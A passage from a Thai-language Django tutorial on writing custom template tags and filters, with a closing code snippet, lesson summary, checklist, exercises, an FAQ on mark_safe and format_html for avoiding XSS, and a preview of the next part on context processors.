            f"{bits[0]} ต้องการ argument 2 ตัว: cache_key และ timeout_seconds"
        )
    _, cache_key_raw, timeout_raw = bits
    cache_key_expr = parser.compile_filter(cache_key_raw)
    timeout_expr = parser.compile_filter(timeout_raw)
    nodelist = parser.parse(('endcache_block',))
    parser.delete_first_token()
    return CacheBlockNode(nodelist, cache_key_expr, timeout_expr)


# ---- ขั้นตอนที่ 288: ตัวอย่างการใช้ format_html() อย่างปลอดภัย ----
@register.filter
def wrap_badge(value, css_class="badge"):
    return format_html('<span class="{}">{}</span>', css_class, value)
```

### 290.2 สรุปสิ่งที่ได้เรียนรู้ใน Part นี้

- ✅ ตั้งค่าโฟลเดอร์ `templatetags/` ในแอปได้ถูกต้อง (`__init__.py`, `register`)
  และเข้าใจว่าทำไม Django ถึงหา library เจอโดยอัตโนมัติจาก `INSTALLED_APPS`
- ✅ เขียน `simple_tag` ที่รับ argument ได้ไม่จำกัดจำนวน ทั้ง positional และ
  keyword argument
- ✅ เขียน custom filter ด้วย `@register.filter` ที่รับ argument เพิ่มได้ 1 ตัว
  และเข้าใจข้อจำกัดที่ทำให้ filter ต่างจาก tag
- ✅ เขียน `inclusion_tag` ที่ render sub-template ของตัวเอง พร้อมควบคุม context
  ที่ส่งเข้าไปอย่างชัดเจน
- ✅ เข้าใจว่า `assignment_tag` ถูกถอดออกแล้ว และใช้ `simple_tag` ร่วมกับ `as`
  แทนได้ทันทีโดยไม่ต้องแก้โค้ดฟังก์ชัน
- ✅ เขียน tag ที่เข้าถึง context ทั้งหมดด้วย `takes_context=True` และรู้ว่าเมื่อไหร่
  ควร/ไม่ควรใช้
- ✅ เขียน custom `Node` class และ compile function สำหรับ tag แบบมี
  opening/closing (`{% cache_block %}...{% endcache_block %}`)
- ✅ เข้าใจความเสี่ยงของ `mark_safe()` และรู้จักใช้ `format_html()`/
  `format_html_join()` แทนเพื่อป้องกัน XSS
- ✅ เขียนเทสต์ครบทั้ง 3 ระดับ: unit test ฟังก์ชันตรง ๆ, render ผ่าน
  `Template`/`Context`, และ integration ผ่าน view จริง

### 290.3 Checklist ก่อนไป Part ถัดไป

- [ ] มีไฟล์ `blog/templatetags/__init__.py` และ `blog/templatetags/blog_extras.py`
- [ ] `{% load blog_extras %}` ใช้งานได้ไม่ error ในเทมเพลตของแอป `blog`
- [ ] `{% reading_time post.content %}` แสดงผลถูกต้อง
- [ ] `{{ post.content|truncate_smart:80 }}` ตัดข้อความโดยไม่ตัดกลางคำ
- [ ] `{% render_post_card post %}` render การ์ดบทความสำเร็จ
- [ ] `{% reading_time post.content as rt %}` เก็บค่าใส่ตัวแปรได้ และนำไปใช้ต่อได้
- [ ] `{% active_link 'blog:list' %}` คืน `"active"` เมื่ออยู่หน้า list จริง
- [ ] `{% cache_block "key" 60 %}...{% endcache_block %}` ทำงานได้และ cache ผล
      สำเร็จ (ลองแก้ข้อมูลข้างในระหว่าง cache ยังไม่หมดอายุ แล้วสังเกตว่า HTML
      ไม่เปลี่ยนจนกว่า cache จะหมดอายุ)
- [ ] รัน `python manage.py test blog.tests.test_templatetags` ผ่านทุกเทสต์

### 290.4 แบบฝึกหัดท้ายบท

**แบบฝึกหัดที่ 1**: เขียน custom filter ชื่อ `thai_timesince` ที่รับค่า
`datetime` แล้วคืนข้อความแบบ humanize เป็นภาษาไทย เช่น `"2 ชั่วโมงที่แล้ว"`,
`"3 วันที่แล้ว"`, `"เมื่อสักครู่"` (ถ้าน้อยกว่า 1 นาที) โดยใช้
`django.utils.timezone.now()` คำนวณผลต่างเวลา แล้วแบ่งช่วง (วินาที, นาที, ชั่วโมง,
วัน, เดือน, ปี) เลือกหน่วยที่เหมาะสมที่สุดมาแสดง จากนั้นเขียนเทสต์ครบทั้ง 3 ระดับ
ตามที่เรียนในขั้นตอนที่ 289 ครอบคลุมอย่างน้อย: เมื่อสักครู่, N นาทีที่แล้ว, N
ชั่วโมงที่แล้ว, N วันที่แล้ว และเวลาที่เป็นอนาคต (ควร handle ไม่ให้ error หรือ
แสดงข้อความที่สมเหตุสมผล เช่น `"เมื่อสักครู่"` เช่นกัน)

**แบบฝึกหัดที่ 2**: ปรับปรุง `render_post_card` (inclusion_tag จากขั้นตอนที่ 284)
ให้รองรับ `takes_context=True` แล้วเพิ่มความสามารถใหม่: ถ้า `request.user` เป็น
staff (`request.user.is_staff`) ให้แสดงปุ่ม "แก้ไข" ที่ลิงก์ไปหน้า admin ของ
บทความนั้นเพิ่มเข้าไปใน `_post_card.html` เขียนเทสต์ยืนยันว่าปุ่มปรากฏเมื่อ
`is_staff=True` และไม่ปรากฏเมื่อ `is_staff=False` หรือไม่ได้ login

**แบบฝึกหัดที่ 3**: เขียน custom tag แบบมี opening/closing ของตัวเอง (ใช้ความรู้
จากขั้นตอนที่ 287) ชื่อ `{% highlight_terms "django,python" %}...
{% endhighlight_terms %}` ที่ห่อคำที่ตรงกับคำในรายการ (คั่นด้วย comma) ด้วย
`<mark>` **โดยไม่เปิดช่องโหว่ XSS** (ต้องใช้ `format_html`/`format_html_join`
ไม่ใช่ `mark_safe` กับ string ที่ต่อเอง) เขียนเทสต์ที่พิสูจน์ว่าฟีเจอร์นี้ยังคง
escape เนื้อหาอันตรายที่ไม่เกี่ยวกับคำที่ไฮไลต์ได้ถูกต้อง (เช่น ถ้าเนื้อหามี
`<script>` ปนอยู่ ต้องไม่ถูก render เป็น script จริง)

**แบบฝึกหัดที่ 4 (ขั้นสูง)**: เขียน management command เทียบประสิทธิภาพ (benchmark)
ระหว่างการเรียก `{% render_post_card %}` 1,000 ครั้งแบบไม่มี cache กับการห่อด้วย
`{% cache_block %}` จากขั้นตอนที่ 287 บันทึกเวลาที่ใช้ทั้งสองแบบด้วยโมดูล `time`
ของ Python แล้วเขียนสรุปว่าในสถานการณ์ไหนที่ `cache_block` ให้ประโยชน์ชัดเจน และ
สถานการณ์ไหนที่การ cache อาจสร้างปัญหา (เช่น ข้อมูลที่ต้องอัปเดตแบบ real-time)

### 290.5 คำถามที่พบบ่อย (FAQ)

**Q: ควรเลือกเขียน `simple_tag` หรือ `filter` เมื่อไหร่?**
A: ใช้กฎง่าย ๆ: ถ้าแปลง**ค่าเดียว** และต้องการ chain ต่อกับ filter อื่นได้ หรือ
ใช้ใน `{% if %}` ได้ ให้เลือก `filter` ถ้าต้องการ argument มากกว่า 1 ตัว หรือ
ต้องการเข้าถึงข้อมูลหลายอย่างพร้อมกัน (เช่น `request`, หลาย model) ให้เลือก
`simple_tag`

**Q: `inclusion_tag` กับการเขียน `{% include %}` ธรรมดา อันไหนควรใช้เป็นค่า
เริ่มต้น?**
A: ถ้า partial นั้นไม่มี logic คำนวณอะไรก่อน render (แค่ดึง context มาแปะตรง ๆ)
ใช้ `{% include %}` ก็เพียงพอและง่ายกว่า — เลือกใช้ `inclusion_tag` เฉพาะเมื่อ
ต้องมีการประมวลผลข้อมูลก่อน (เช่น กำหนดค่า default, คำนวณ, กรองข้อมูล) เพราะการ
เขียน Python function ทำให้ทดสอบและอ่าน logic ได้ชัดเจนกว่าการซ่อน logic ไว้ใน
context ที่ view ส่งมาให้เทมเพลตเดา

**Q: ทำไม `mark_safe()` ยังมีอยู่ใน Django ถ้ามันอันตรายขนาดนี้?**
A: `mark_safe()` ไม่ได้ผิดโดยตัวมันเอง — มันจำเป็นสำหรับกรณีที่ string นั้น
ปลอดภัยจริง ๆ (เช่น HTML ที่ hardcode ไว้ในโค้ดของนักพัฒนาเอง ไม่มีส่วนใดมาจาก
ผู้ใช้) ปัญหาอยู่ที่การนำไปใช้ผิดกับข้อมูลที่ไม่น่าเชื่อถือ กฎที่ต้องจำคือ:
"`mark_safe()` ควรอยู่ใกล้กับจุดที่ HTML ถูก **สร้าง** ให้มากที่สุด และไม่ควรครอบ
ค่าที่มาจากภายนอกโดยไม่ผ่านการ escape หรือ sanitize ก่อน"

**Q: ทำไม compile function ของ `{% cache_block %}` ต้องเรียก
`parser.delete_first_token()` เอง ทำไม Django ไม่จัดการให้อัตโนมัติ?**
A: เพราะ `parser.parse()` ออกแบบมาให้ยืดหยุ่นรองรับ tag ที่มีหลาย branch ได้
(เช่น `{% if %}...{% else %}...{% endif %}` ที่ต้องเรียก `parser.parse()` สองรอบ
โดยรอบแรกหยุดที่ `else` แล้วค่อยรอบสองหยุดที่ `endif`) การให้ compile function
เป็นคนตัดสินใจเองว่าจะ "กิน" token ปิดตอนไหน ทำให้ Django รองรับ tag ที่ซับซ้อน
หลายรูปแบบได้โดยไม่ต้องเพิ่ม API พิเศษสำหรับแต่ละกรณี

### 290.6 เตรียมตัวสำหรับ Part ถัดไป

**Part 030: Context Processors และ Template Best Practices** จะพาไปเจาะลึกเรื่อง
**Context Processors** แบบเต็มรูปแบบ (ที่แตะเบา ๆ ไปแล้วใน Part 008 ขั้นตอนที่ 79)
— วิธีเขียน context processor ของตัวเองเพื่อฉีดตัวแปรที่ต้องใช้ **ทุกเทมเพลตทั่ว
ทั้งเว็บไซต์** (เช่น หมวดหมู่ยอดนิยม, การตั้งค่าเว็บไซต์, จำนวนแจ้งเตือน) โดยไม่
ต้องส่งซ้ำทุก view รวมถึง Template Best Practices ระดับมืออาชีพ: การจัดโครงสร้าง
โฟลเดอร์ template ในโปรเจกต์ขนาดใหญ่, การจัดการ template fragment ให้ทดสอบง่าย,
และการหลีกเลี่ยง anti-pattern ที่พบบ่อยเมื่อ custom tag/filter เริ่มมีจำนวนมากขึ้น
เตรียม `blog_extras.py` ที่สร้างเสร็จใน Part นี้ไว้ให้พร้อม เพราะ Part หน้าจะกลับมา
ใช้งานร่วมกับ context processor ที่จะสร้างใหม่ด้วย
